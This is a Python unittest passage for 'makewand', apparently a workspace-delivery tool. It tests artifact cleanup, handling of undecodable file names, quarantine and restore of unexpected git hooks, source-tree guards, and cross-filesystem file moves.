            with self.subTest(rel=rel):
                self.assertEqual(orch._filter_non_deliverable_test_changes([rel], str(plain)), [])
        for rel in ("coverage.py", "coverage/conftest.py"):
            with self.subTest(rel=rel):
                self.assertEqual(orch._filter_non_deliverable_test_changes([rel], str(plain)), [rel])

    def test_js_and_browser_test_reports_written_by_the_run_are_cleaned_up(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="coverage/\nplaywright-report/\ntest-results/\n")
        reports = {"coverage/lcov-report/index.html": "<html/>", "coverage/lcov-report/prettify.js": "x",
                   "coverage/tmp/coverage-1-2-0.json": "{}", "playwright-report/index.html": "<html/>",
                   "test-results/.last-run.json": "{}"}

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write(reports)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        for rel in list(reports) + ["coverage", "playwright-report", "test-results"]:
            self.assertFalse(os.path.lexists(self.root / rel), rel)

    def test_preexisting_vitest_results_rewritten_by_the_run_are_kept(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="node_modules/\n")
        results = self.root / "node_modules/.vite/vitest/da39a3ee/results.json"
        self.write({"node_modules/.vite/vitest/da39a3ee/results.json": '{"results":{"a":1}}'})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            results.write_text('{"results":{"a":2,"b":3}}')

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual(results.read_text(), '{"results":{"a":2,"b":3}}')

    def test_vite_transform_cache_written_by_the_run_still_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="node_modules/\n")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"node_modules/.vite/deps/react.js": "export default {}\n"})

        self.assertBlocked(self.deliver(task), "node_modules/.vite/deps/react.js")


@unittest.skipUnless(os.name == "posix", "undecodable file names are a POSIX matter")
class UndecodableNameTests(HostDeliveryCase):
    def finalize_strict(self, txn):
        """finalize_success with a strict UTF-8 stdout/stderr, as a real terminal pipe has."""
        buffer = io.BytesIO()
        stream = io.TextIOWrapper(buffer, encoding="utf-8", errors="strict", write_through=True)
        with contextlib.redirect_stdout(stream), contextlib.redirect_stderr(stream):
            txn.finalize_success()
        self.output = buffer.getvalue().decode("utf-8")
        return txn

    def raw_path(self, rel_bytes):
        return os.fsencode(str(self.root)) + b"/" + rel_bytes

    def test_undecodable_name_of_a_blocked_file_does_not_break_the_report(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="build/\n")
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        (self.root / "build").mkdir()
        with open(self.raw_path(b"build/evil\xff.sh"), "wb") as handle:
            handle.write(b"x")

        self.finalize_strict(txn)

        self.assertFalse(txn.succeeded)
        self.assertEqual(txn.state, "rolled_back")
        self.assertIn("build/evil\\xff.sh", self.output)
        self.assertIn("build/evil\\xff.sh", txn.failure_reason)
        txn.failure_reason.encode("utf-8")
        self.assertFalse(os.path.lexists(self.raw_path(b"build/evil\xff.sh")))
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    @unittest.skipUnless(shutil.which("bash"), "the restore hint is a bash command")
    def test_undecodable_hook_name_is_quarantined_with_a_working_restore_command(self):
        self.commit({"app.py": "VALUE = 1\n"})
        hook = self.raw_path(b".git/hooks/pre-commit\xff")
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        with open(hook, "wb") as handle:
            handle.write(b"#!/bin/sh\nexit 0\n")

        self.finalize_strict(txn)

        self.assertEqual(txn.outcome_status, "UNVERIFIED")
        self.assertFalse(os.path.lexists(hook))
        command = re.search(r"移回即可: (.*)）", self.output).group(1)
        subprocess.run(["bash", "-c", command], check=True)
        self.assertTrue(os.path.lexists(hook))

    def test_preexisting_undecodable_name_does_not_abort_the_baseline(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="data/\n")
        (self.root / "data").mkdir()
        with open(self.raw_path(b"data/lat\xe9.csv"), "wb") as handle:
            handle.write(b"a,b\n")
        txn = self.start()
        index = json.loads((txn.backup_dir / "index.json").read_text(encoding="utf-8"))
        self.assertEqual([os.fsencode(item["path"]) for item in index["files"]], [b"data/lat\xe9.csv"])
        (self.root / "app.py").write_text("VALUE = 2\n")

        self.assertDelivered(self.finalize_strict(txn))

    def test_delivery_destination_messages_print_undecodable_names(self):
        self.assertEqual(delivery._shown(os.fsdecode(b"lat\xe9.txt")), "lat\\xe9.txt")
        with open(self.raw_path(b"anc\xff"), "wb") as handle:
            handle.write(b"a regular file where the patch expects a directory\n")
        frozen = delivery.capture_delivery_baseline(str(self.root))
        changes = {os.fsdecode(b"anc\xff") + "/x.txt": ["file", "0" * 64, 0o644]}

        with self.assertRaises(OSError) as raised:
            delivery.write_delivery_checkpoint(frozen, changes, str(self.base / "checkpoint"))

        self.assertIn("anc\\xff", str(raised.exception))
        str(raised.exception).encode("utf-8")


class TestHarnessSourceGuardTests(HostDeliveryCase):
    """Under the test harness no host transaction covers makewand's own source tree."""

    def test_transaction_refuses_the_source_tree_a_directory_inside_it_and_its_parents(self):
        self.commit({"makewand/__init__.py": "", "README.md": "x\n"})
        with patch.object(git_helper, "_makewand_source_root", return_value=self.root.resolve()):
            for target in (self.root, self.root / "makewand", self.base):
                with self.subTest(target=str(target)):
                    txn = HostWorkspaceTransaction(str(target))
                    self.assertIn("测试环境中拒绝", txn.capture_pre_snapshot() or "")
                    self.assertIsNotNone(txn.begin())
                    self.write({"README.md": "work in progress\n", "CREATED.txt": "another session\n"})
                    self.assertFalse(txn.rollback("probe"))
                    self.assertEqual((self.root / "README.md").read_text(), "work in progress\n")
                    self.assertTrue((self.root / "CREATED.txt").exists())

    def test_guard_follows_the_real_source_root_and_only_applies_under_the_harness(self):
        source = Path(git_helper.__file__).resolve().parent.parent
        self.assertEqual(git_helper._makewand_source_root(), source)
        self.assertIsNotNone(git_helper.harness_source_tree_conflict(str(source)))
        self.assertIsNone(git_helper.harness_source_tree_conflict(str(self.root)))
        with patch.dict(os.environ):
            os.environ.pop("MAKEWAND_TEST_ISOLATION_ROOT", None)
            self.assertIsNone(git_helper.harness_source_tree_conflict(str(source)))


class MoveAsideTests(unittest.TestCase):
    def test_moves_files_links_and_directories_across_filesystems(self):
        with tempfile.TemporaryDirectory(prefix="mw-fix-move-") as tmp:
            base = Path(tmp)
            (base / "hook").write_text("#!/bin/sh\n")
            os.chmod(base / "hook", 0o755)
            os.symlink("hook", base / "link")
            (base / "hooks.d").mkdir()
            (base / "hooks.d" / "a").write_text("a\n")

            def cross_device(*args, **kwargs):
                raise OSError(errno.EXDEV, "Invalid cross-device link")

            with patch.object(git_helper.os, "rename", side_effect=cross_device):
                moved = {name: git_helper._move_aside(str(base / name), base / "q") for name in ("hook", "link", "hooks.d")}

            self.assertEqual(moved["hook"].read_text(), "#!/bin/sh\n")
            self.assertTrue(os.stat(moved["hook"]).st_mode & 0o100)
            self.assertEqual(os.readlink(moved["link"]), "hook")
            self.assertEqual((moved["hooks.d"] / "a").read_text(), "a\n")
            for name in ("hook", "link", "hooks.d"):
                self.assertFalse(os.path.lexists(base / name))


if __name__ == "__main__":
    unittest.main()
